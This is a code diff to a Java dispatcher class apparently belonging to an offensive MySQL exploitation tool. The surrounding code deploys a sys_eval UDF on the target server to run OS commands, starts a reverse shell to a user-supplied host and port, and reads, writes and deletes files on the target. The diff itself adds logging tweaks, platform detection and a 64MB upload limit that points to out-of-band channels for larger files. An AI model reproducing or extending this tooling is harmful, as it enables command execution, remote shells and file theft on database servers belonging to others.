@@ -49,7 +49,7 @@ public class MysqlDispatcher extends BaseDispatcher {
             String res = dao.eval(cmd, code);
             if (!dao.sysEvalExists()) {
                 // 自动部署链（docs/3 §3.2）：getInfo→initUDF→udf(sys_eval) 后重试一次
-                ctx.reporter.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链...");
+                ctx.reporter.log(Util.Utils.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链..."));
                 dao.getInfo();
                 dao.udf("sys_eval");
                 res = dao.eval(cmd, code);
@@ -66,13 +66,16 @@ public class MysqlDispatcher extends BaseDispatcher {
             dao.getConnection();
             dao.getInfo();
             if (dao.getMysqlPlatform() != null && !dao.getMysqlPlatform().startsWith("Win")) {
-                ctx.reporter.log("[mdut] 警告: backshell 为 Windows DLL 路线，Linux 目标建议直接 exec");
+                ctx.reporter.log(Util.Utils.log("[mdut] 警告: backshell 为 Windows DLL 路线，Linux 目标建议直接 exec"));
             }
             dao.reverseShell(p.positionals.get(0), p.positionals.get(1), code);
             return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
         }
         // ---- 文件操作（M3a；linux 走 sys_eval，win 走 cmd /c） ----
         dao.getConnection(); // 文件分支独立入口：确保 CONN 就绪（read/download 不经 UDF 链）
+        if (dao.getMysqlPlatform() == null) {
+            dao.getInfo(); // 平台探测（Win/Linux 命令分派依赖），幂等
+        }
         boolean win = dao.getMysqlPlatform() != null && dao.getMysqlPlatform().startsWith("Win");
         if ("list-files".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
             String arg = p.positionals.get(0);
@@ -111,6 +114,10 @@ public class MysqlDispatcher extends BaseDispatcher {
                 remote = p.positionals.get(0);
             } else {
                 byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
+                if (bytes != null && bytes.length > 64 * 1024 * 1024) {
+                    return Result.usage("文件超过 64MB 上限（SQL 管道内存约束，hex/base64 化会翻倍）",
+                            "大文件请分块写入或用 download/upload 之外的带外通道").withId(id);
+                }
                 if (bytes == null) {
                     return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
                 }
@@ -129,7 +136,7 @@ public class MysqlDispatcher extends BaseDispatcher {
     /** sys_eval 自动部署链（幂等：已部署直接返回） */
     private void ensureSysEval(MysqlDao dao, Ctx ctx) throws Exception {
         if (!dao.sysEvalExists()) {
-            ctx.reporter.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链...");
+            ctx.reporter.log(Util.Utils.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链..."));
             dao.getInfo();
             dao.udf("sys_eval");
         }
